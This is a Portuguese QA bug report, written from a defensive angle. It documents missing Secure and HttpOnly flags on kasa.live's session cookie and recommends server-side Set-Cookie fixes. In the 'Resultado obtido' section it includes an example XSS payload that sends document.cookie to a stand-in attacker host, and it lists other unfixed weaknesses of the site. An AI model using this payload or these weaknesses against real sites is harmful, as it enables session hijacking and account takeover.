# BUG-022 — Segurança: cookie de auth `next-leap_access` sem flags Secure nem HttpOnly (vulnerável a XSS hijack e SSL stripping)

**Severidade:** Critical
**Prioridade:** P0
**Status:** Open
**Reproduzibilidade:** Sempre
**Frequência observada:** 1/1 sessão autenticada inspecionada
**Regressão?:** Desconhecido
**Trello card:** TBD

## Pré-condição

- Conta válida em https://www.kasa.live (`KASA_USER_EMAIL` / `KASA_USER_PASSWORD` em `.env.local`).
- DevTools → Application → Cookies disponível (ou o spec automatizado).

## Passos para reproduzir

1. Abrir https://www.kasa.live em browser limpo.
2. Fazer login com conta válida (modal "Entrar" no header).
3. Abrir DevTools → Application → Cookies → https://www.kasa.live.
4. Procurar pelo cookie `next-leap_access` (cookie de sessão emitido após login).
5. Conferir colunas `Secure` e `HttpOnly` — ambas estão **desmarcadas (false)**.
6. Reprodução automatizada: `npm run test:security` → `cookies-flags.spec.ts` (segundo teste).

## Resultado esperado

Qualquer cookie usado para sessão / autenticação deve ter, simultaneamente:

- `Secure: true` — só transmitido sobre HTTPS.
- `HttpOnly: true` — não acessível via `document.cookie` no JS (proteção contra roubo via XSS).
- `SameSite: Lax` ou `Strict` (não `None`) — defesa contra CSRF.

## Resultado obtido

Cookie inspecionado: `next-leap_access` (token de sessão).

```
next-leap_access sem Secure
next-leap_access sem HttpOnly (vulnerável a XSS)
```

- `Secure: false` → cookie pode ser interceptado em rede insegura (café, hotel) caso usuário acesse via `http://www.kasa.live` mesmo que apenas em primeiro hit (BUG-019 também não tem HSTS no header da home com configuração mínima).
- `HttpOnly: false` → **qualquer XSS reflected/stored consegue roubar a sessão** com `fetch('//attacker.tld/?c='+document.cookie)`.

Combinado com BUG-013, BUG-014 (a11y/JSX problemáticos sugerindo handlers customizados) e ausência de CSP (BUG-019) → vetor completo de **session hijacking**.

## Ambiente

- URL: https://www.kasa.live (após login)
- Cookie inspecionado: `next-leap_access`
- Browser/versão: Chromium 130 (Playwright 1.50)
- Sistema: macOS 26.3.1
- Viewport: 1440x900
- Data/hora do achado: 2026-05-02

## Evidência

- `automation/tests/security/cookies-flags.spec.ts` — segundo teste falha reproduzivelmente.
- `bug-reports/evidence/BUG-022/` (screenshot DevTools + spec error-context).
- Trace Playwright em `test-results/security-cookies-flags--se-5f771-em-Secure-HttpOnly-SameSite-chromium/trace.zip`.

## Workaround conhecido

- Nenhum no lado do usuário. Browser não consegue impor flags que o servidor não setou.

## Sugestão de fix / hipótese de causa raiz

- **Causa raiz hipotética:** o cookie `next-leap_access` é setado no client-side (provavelmente por `js-cookie`/`document.cookie = ...` após receber o token via XHR), o que torna impossível setar `HttpOnly` (apenas o servidor consegue, via `Set-Cookie` no response). Ou setado no server-side mas com flags default não seguras.

- **Fix sugerido:**
  1. Mover a emissão do cookie de sessão para o servidor (rota `/api/auth/login` no Next.js como BFF) e setar via `Set-Cookie` com `Secure; HttpOnly; SameSite=Lax`.
     ```ts
     // app/api/auth/login/route.ts
     return new Response(JSON.stringify({ ok: true }), {
       status: 200,
       headers: {
         'Set-Cookie': `next-leap_access=${token}; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=86400`,
       },
     });
     ```
  2. Para client-side calls que precisam do token, usar header `Authorization: Bearer ...` derivado de uma API interna do BFF (não expor o token ao JS).
  3. Adicionar teste de regressão (já existe: `cookies-flags.spec.ts`).
  4. Considerar token rotation + short TTL (15min) com refresh token HttpOnly separado.

## Impacto no usuário

- **Session hijacking:** qualquer XSS em qualquer página do site permite roubar a sessão completa de qualquer usuário. Atacante pode favoritar/desfavoritar times, modificar dados, conectar Google Calendar de outra pessoa, ou excluir conta da vítima.
- **Risco amplificado por:**
  - BUG-019 (sem CSP defense-in-depth na home).
  - BUG-014 (componentes customizados sem semântica adequada — superfície maior pra DOM XSS).
  - Cookie persiste enquanto válido — uma única exposição de token = sessão controlada permanentemente.
- **Compliance:** OWASP Top 10 2021 A07 (Identification and Authentication Failures) + LGPD (responsabilidade do controlador por dados pessoais).
- **Severidade Critical:** auth cookie sem `HttpOnly` é considerado violação **mandatória** em qualquer auditoria PCI-DSS / SOC 2.
